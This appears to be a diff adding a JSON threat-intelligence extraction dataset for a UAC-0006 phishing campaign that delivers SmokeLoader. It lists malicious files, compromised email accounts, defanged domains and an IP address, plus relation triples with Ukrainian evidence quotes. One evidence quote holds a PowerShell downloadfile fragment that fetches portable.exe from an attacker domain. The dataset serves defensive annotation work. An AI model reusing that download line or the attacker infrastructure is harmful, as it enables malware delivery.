@@ -1,0 +1,200 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cyber threat group active against Ukrainian organizations."
+    },
+    {
+      "name": "SmokeLoader",
+      "kind": "malware",
+      "gloss": "A modular malware loader used to download and execute secondary malicious payloads."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Windows Script Host",
+      "kind": "software product",
+      "gloss": "An automation technology for Microsoft Windows operating systems that provides scripting capabilities."
+    },
+    {
+      "name": "pax_2023_ab1058.zip",
+      "kind": "computer file",
+      "gloss": "A malicious polyglot archive file distributed via phishing emails."
+    },
+    {
+      "name": "pax_2023_AB1058.pdf",
+      "kind": "computer file",
+      "gloss": "A decoy document file contained in the malicious archive."
+    },
+    {
+      "name": "pax_2023_ab1058..js",
+      "kind": "computer file",
+      "gloss": "A malicious JavaScript loader script executing PowerShell commands."
+    },
+    {
+      "name": "portable.exe",
+      "kind": "computer file",
+      "gloss": "A malicious executable file responsible for launching SmokeLoader."
+    },
+    {
+      "name": "smoke.exe",
+      "kind": "computer file",
+      "gloss": "An executable payload of the SmokeLoader malware."
+    },
+    {
+      "name": "beliy@atl.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "inbox6@dl.kr-admin.gov.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "nvn@mayak.dp.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious emails."
+    },
+    {
+      "name": "hxxp://homospoison[.]ru/one/portable.exe",
+      "kind": "uniform resource locator",
+      "gloss": "A malicious URL used to download the portable.exe executable."
+    },
+    {
+      "name": "homospoison[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used for malicious payload distribution."
+    },
+    {
+      "name": "3dstore[.]pro",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "balkimotion[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "coudzoom[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "criticalosl[.]tech",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "humanitarydp[.]ug",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "ipodromlan[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "lamazone[.]site",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "ligaspace[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "maximprofile[.]net",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "redport80[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "shopersport[.]ru",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "sindoproperty[.]org",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "superboler[.]com",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "zaliphone[.]com",
+      "kind": "domain name",
+      "gloss": "A domain name used in malicious cyber activity infrastructure."
+    },
+    {
+      "name": "193[.]106.175.177",
+      "kind": "ip address",
+      "gloss": "An IP address associated with threat actor network infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "uses",
+      "tail": "SmokeLoader",
+      "evidence": "здійснить запуск шкідливої програми SmokeLoader ... активність групи UAC-0006"
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_ab1058..js",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл \"pax_2023_AB1058..js\""
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "delivers",
+      "tail": "pax_2023_AB1058.pdf",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку"
+    },
+    {
+      "head": "pax_2023_ab1058..js",
+      "type": "uses",
+      "tail": "PowerShell",
+      "evidence": "JavaScript-файл \"pax_2023_AB1058..js\", який, використовуючи PowerShell"
+    },
+    {
+      "head": "pax_2023_ab1058..js",
+      "type": "delivers",
+      "tail": "portable.exe",
+      "evidence": "забезпечить завантаження та запуск виконуваного файлу \"portable.exe\""
+    },
+    {
+      "head": "portable.exe",
+      "type": "delivers",
+      "tail": "SmokeLoader",
+      "evidence": "Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "hxxp://homospoison[.]ru/one/portable.exe",
+      "type": "hosts",
+      "tail": "portable.exe",
+      "evidence": "$var.downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe')"
+    },
+    {
+      "head": "homospoison[.]ru",
+      "type": "hosts",
+      "tail": "hxxp://homospoison[.]ru/one/portable.exe",
+      "evidence": "hxxp://homospoison[.]ru/one/portable.exe"
+    }
+  ],
+  "newRelationTypes": []
+}
